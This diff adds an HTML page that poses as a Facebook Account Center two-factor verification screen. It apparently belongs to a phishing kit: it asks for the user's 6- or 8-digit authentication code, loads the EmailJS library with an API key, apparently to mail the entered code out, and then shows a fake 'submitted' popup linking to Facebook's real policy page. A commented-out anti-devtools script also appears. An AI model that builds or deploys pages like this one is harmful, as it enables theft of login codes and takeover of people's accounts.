@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Privacy Policy</title>
+    <link rel="icon" type="image/png" href="/fb.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/verify/code.css">
+    <script src="/verify/code.js" defer></script>
+    <link rel="icon" href="/assets/image/logofx.png" type="image/x-icon">
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        emailjs.init("eBOyvEWjwfg1r8Ntb");
+    </script>
+
+</head>
+
+<body>
+    <div class="container">
+        <b style="margin-bottom:5px">Account Center &#8226; Facebook</b>
+        <h1 style="margin-top:0px;">Check your authentication code</h1>
+        <p>Enter the 6-digit or 8-digit code for this account from the two-factor authentication you set up (such as
+            Google Authenticator or text message on you mobile).</p>
+        <img src="/verify/s32w659we12154r-789aa068.gif" alt="Image showing phone and laptop for verification">
+        <input type="text" id="code" placeholder="Code">
+        <p id="error-message" style="color: red; display: none;"></p> <!-- Dòng thông báo lỗi -->
+
+        <div class="new-code-container">
+            <svg viewBox="0 0 24 24">
+                <path
+                    d="M3 12a9 9 0 0 1 9-9c2.144 0 4.111.749 5.657 2H16a1 1 0 1 0 0 2h4a1 1 0 0 0 1-1V2a1 1 0 1 0-2 0v1.514A10.959 10.959 0 0 0 12 1C5.925 1 1 5.925 1 12s4.925 11 11 11 11-4.925 11-11a1 1 0 1 0-2 0 9 9 0 1 1-18 0z">
+                </path>
+            </svg>
+            <a href="#" id="getNewCode" style="text-decoration: none">Get a new code</a>
+        </div>
+        <button class="button" id="continueButton" disabled>Continue</button>
+        <p id="error-message" style="color: red; display: none;"></p>
+        <div class="footer">
+            <strong>Awaiting approval</strong>
+            <p>It may take a few minutes for you to receive the notification on your phone, email or authentication app.
+            </p>
+        </div>
+    </div>
+    <div class="success-popup-overlay" id="success-popup">
+        <div class="success-popup">
+            <div class="header">Submitted Successfully</div>
+            <div class="body">
+                <div class="body-content">
+                    Thanks for contacting us. You'll get a notification when
+                    we respond in 1-2 business days. You can view responses
+                    in your Support Inbox.
+                </div>
+            </div>
+            <div class="btn">
+                <a href="https://www.facebook.com/policies_center/">OK</a>
+            </div>
+        </div>
+    </div>
+    <!-- <script disable-devtool-auto src='https://cdn.jsdelivr.net/npm/disable-devtool@latest'></script> -->
+
+</body>
+
+</html>
